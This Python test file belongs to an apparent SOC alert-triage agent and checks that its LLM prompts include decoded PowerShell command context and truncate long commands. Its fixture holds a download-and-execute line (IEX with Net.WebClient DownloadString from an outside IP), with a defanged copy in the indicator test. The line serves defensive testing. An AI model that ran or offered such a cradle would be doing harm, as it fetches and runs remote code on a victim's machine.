from datetime import datetime, timezone
from uuid import uuid4

from app.agent.prompts import (
    build_draft_canonical_prompt,
    build_draft_experimental_prompt,
    build_extract_indicators_prompt,
    build_risk_assessment_prompt,
    build_self_check_prompt,
)
from app.agent.schemas import DraftReportCanonical, PatternType, RecommendedAction
from app.schemas import AgentRef, Alert, CommandDecodeResult, Confidence, DecodedSegment, RiskAssessment, Severity


def _make_alert(**overrides):
    defaults = dict(
        alert_id=uuid4(),
        source_alert_id="1700000000.987654",
        source_system="wazuh",
        rule_id="92009",
        rule_description="Sysmon - process creation",
        rule_level=12,
        timestamp=datetime.now(timezone.utc),
        ingested_at=datetime.now(timezone.utc),
        agent=AgentRef(id="003", name="WIN-DESKTOP01", ip="172.20.10.5"),
        manager_name="wazuh-manager",
        location="EventChannel",
        full_log="",
        raw_json={"rule": {"id": "92009"}},
    )
    defaults.update(overrides)
    return Alert(**defaults)


_COMMAND_CONTEXT = CommandDecodeResult(
    command_line="powershell.exe -EncodedCommand SQBFAFgA...",
    parent_command_line="C:\\Windows\\explorer.exe",
    decoded_segments=[
        DecodedSegment(
            encoding="powershell_encoded",
            original="SQBFAFgA...",
            decoded="IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.1/a.ps1')",
        )
    ],
)


def test_risk_assessment_prompt_includes_command_context_when_present():
    prompt = build_risk_assessment_prompt(_make_alert(), PatternType.OTHER, 0, [], command_context=_COMMAND_CONTEXT)

    assert "powershell.exe -EncodedCommand" in prompt
    assert "185.220.101.1" in prompt


def test_risk_assessment_prompt_omits_command_context_when_absent():
    prompt = build_risk_assessment_prompt(_make_alert(), PatternType.OTHER, 0, [])

    assert "Command line:" not in prompt


def test_draft_canonical_prompt_includes_command_context():
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    prompt = build_draft_canonical_prompt(
        _make_alert(), PatternType.OTHER, 0, [], risk_assessment, command_context=_COMMAND_CONTEXT
    )

    assert "185.220.101.1" in prompt


def test_draft_experimental_prompt_includes_command_context():
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    prompt = build_draft_experimental_prompt(
        _make_alert(), PatternType.OTHER, 0, [], risk_assessment, command_context=_COMMAND_CONTEXT
    )

    assert "185.220.101.1" in prompt


def test_self_check_prompt_includes_command_context():
    draft = DraftReportCanonical(alert_summary="x", rationale="y", recommended_actions=[RecommendedAction.MONITOR_NO_ACTION])
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    prompt = build_self_check_prompt(
        draft, PatternType.OTHER, 0, [], risk_assessment, command_context=_COMMAND_CONTEXT
    )

    assert "185.220.101.1" in prompt


def test_extract_indicators_prompt_includes_extra_texts_when_present():
    prompt = build_extract_indicators_prompt(
        _make_alert(), extra_texts=["IEX (New-Object Net.WebClient).DownloadString('hxxp://185[.]220[.]101[.]1/a.ps1')"]
    )

    assert "185[.]220[.]101[.]1" in prompt


def test_extract_indicators_prompt_omits_extra_texts_when_absent():
    prompt = build_extract_indicators_prompt(_make_alert())

    assert "Additional decoded command-line text" not in prompt


def test_command_context_fields_are_truncated_in_prompt():
    long_command = "a" * 1000
    long_context = CommandDecodeResult(command_line=long_command, decoded_segments=[])

    prompt = build_risk_assessment_prompt(_make_alert(), PatternType.OTHER, 0, [], command_context=long_context)

    assert "a" * 501 not in prompt
    assert "...(truncated)" in prompt
